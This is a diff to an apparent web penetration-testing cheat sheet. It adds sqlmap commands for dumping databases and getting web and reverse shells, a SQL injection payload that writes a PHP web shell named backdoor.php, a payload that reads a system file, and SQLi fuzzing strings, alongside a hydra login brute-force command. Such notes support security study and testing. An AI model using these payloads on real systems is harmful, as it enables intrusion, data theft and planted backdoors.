@@ -6,7 +6,6 @@ permalink: /web/
 
 # Index
 
-* [Enumeration](#enumeration)
 * [Authentication](#authentication)
 * [Session Management](#session-management)
 * [XML External Entity](#xml-external-entity)
@@ -17,28 +16,6 @@ permalink: /web/
 * [Other Tools](#other-tools)
 * [Methodology](#methodology)
 
-## Enumeration
-
-Enumerating a web application is best performed manually with automated augmentations.
-
-### Spidering
-
-`burpsuite`
-
-### Directory Brute Forcing
-
-`dirbuster`
-
-### Web Server Scanning
-
-`nikto`
-
-### Scraping 
-
-`cewl`
-
----
-
 ## Authentication
 
 ### Brute Forcing Online
@@ -48,7 +25,6 @@ Enumerating a web application is best performed manually with automated augmenta
 For example attacking a web login form
 
 `hydra 192.168.1.69 http-form-post "form_login.php:user=^USER^&pass=^PASS^:Bad login" -L users.txt -P pass.txt -o hydra-http-post-attack.txt`
-
 
 ---
 
@@ -100,10 +76,43 @@ SELECT username FROM users WHERE username='' or '1'='1' AND password='' or '1'='
 ```
 
 We can also save a request in burp and feed it into `sqlmap` or fuzz with `sqlmap` directly.
+
 ```
 sqlmap
+# sqlmap crawl  
+sqlmap -u http://10.10.10.10 --crawl=1
+
+# sqlmap dump sql database from saved request
+sqlmap -r login.req --dbms=mysql --dump
+
+# sqlmap web shell  
+sqlmap -r login.req --os-shell
+
+# sqlmap reverse shell
+sqlmap -r login.req --os-pwn
+
+SQL Injection Writing a file
+
+```SQL
+union all select 1,2,3,4,"<?php echo shell_exec($_GET['cmd']);?>",6 into OUTFILE 'c:/inetpub/wwwroot/backdoor.php'
 ```
 
+SQL Injection Reading a File
+
+```SQL
+union all select 1,2,3,4,load_file("c:/windows/system32/drivers/etc/hosts"),6
+```
+
+SQL Fuzzing Strings
+
+```SQL
+' or 1=1 LIMIT 1 --
+' or 1=1 LIMIT 1 -- -
+' or 1=1 LIMIT 1#
+'or 1#
+' or 1=1 --
+' or 1=1 -- -
+```
 ---
 
 ## PHP Injection
@@ -136,23 +145,10 @@ Wherever user input is reflect in the site test for XSS with:
 
 ## Other Tools
 
-* FoxyProxy - simple proxy switcher for firefox
 * w3af - Web Application Scanner
-* wikto/Nikto - Web server scanner
-* Firebug/Chrome Dev tools - Inspecting client side
-* Hydra - Password brute forcing
 * wpscan - Scan wordpress
 * droopscan - scan Drupal & Silverstripe CMS
-
-### Unix Commands
-
-* wget - easily download files
-* curl - can make post requests too
-* ncat - tcp/ip swiss army knife
-* socat - two way netcat
-* stunnel - ssl tunnel
-
----
+* cewl - Scraping for strings
 
 ## Methodology
 
